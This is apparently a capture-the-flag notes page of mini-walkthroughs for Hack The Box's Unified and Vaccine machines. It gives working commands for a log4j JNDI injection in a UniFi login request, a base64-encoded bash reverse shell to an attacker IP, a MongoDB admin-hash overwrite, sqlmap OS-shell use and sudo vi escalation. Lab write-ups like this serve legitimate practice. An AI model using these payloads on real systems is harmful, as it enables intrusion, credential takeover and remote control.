
<script type="text/javascript"
  src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js">
</script>

<script>
    mermaid.initialize({
        startOnLoad: true,
 	      theme: 'dark'
<!-- 	'themeVariables': { 'primaryColor': '#00FFFF00'}  -->
    });
</script>

## Mini-walkthroughs for Hack The Box! 

[Unified](https://app.hackthebox.com/starting-point/#unified)

<div class="mermaid">
graph LR

  subgraph Priv. Escalation
  1["Look for <br/> mongodb port"] --> 2["connect to default <br/> database ace"] --> 3["look for <br/> admin collection"] 
  4["mkpasswd -m sha-512"]--> 5["change admin </br> password"] --> 6["login with <br/> new password"] 
  6 --> 7["check site settings <br/> get root ssh password 🏳️"]

  3 --> 5
  end
  
  subgraph Exploit log4j
  a[Exploit log4j] --> b["install openjdk <br/> install Maven"] --> d
  a --> c[" git clone <br/> https://github.com/ <br/> veracode-research/rogue-jndi"] --> d["build <br> mvn package"] 
  a --> e[prepare bash shell] --> f["encode w. base 64"] 
  f --> g["Run the rogue server"]
  d --> g
  a --> h["start a listener <br/> nc -lvp 4444"] --> m["receive a conn. <br/> script /dev/null -c bash"] 
  g --> l["send the exploit:<br/>''${jndi:ldap://IP:1389/o=tomcat}''"] --> m
  end
  
  subgraph Scan
  A[nmap] --> B[8443 <br/> UniFi Network] 
  B --> D["log4j vulnerable <br/> CVE-2021-44228"]
  D --> E["param. remember <br/> Post /api/login"]
  E --> F["test with <br/> ${jndi:ldap://{IP}/whatever}"]
  F --> G["check for LDAP traffic <br/> tcpdump port 389"]
  A --> C[ssh] 
  end
</div>

Useful commands
```bash 
echo 'bash -c bash -i >&/dev/tcp/{IP}/{port} 0>&1' | base64

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" \
--hostname "{YOUR TUN0 IP ADDRESS}"

curl 'https://10.129.12.182:8443/api/login' \
-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' \
-H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' \
--compressed \
-H 'Referer: https://10.129.12.182:8443/manage/account/login?redirect=%2Fmanage' \
-H 'Content-Type: application/json; charset=utf-8' \
-H 'Origin: https://10.129.12.182:8443' \
-H 'Connection: keep-alive' \
--data-raw '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.14.118:1389/o=tomcat}","strict":true}' \
--insecure

mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

mongo --port 27117 ace --eval 'db.admin.update({"_id":\
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'

```


[Vaccine](https://app.hackthebox.com/starting-point/#vaccine)

<div class="mermaid">
graph LR
    A[nmap] --> B[FTP]
    A --> C[http]
    A --> D[ssh]
    B --> E[get zip] --> F[zip2john] --> G[john] --> H([admin/pass]) 
    C --> I[login <br/> admin/pass] --> J["sqlmap --os-shell <br/> dashboard?search"] --> K[bash reverse shell] --> L["look in <br/> /var/www/html"] --> M([postgres/pass])
    D --> N[postgres/pass] --> P["sudo -l"] --> Q["sudo vi"] --> R[GTFOBins] --> S(["root 🏳️"])
</div>

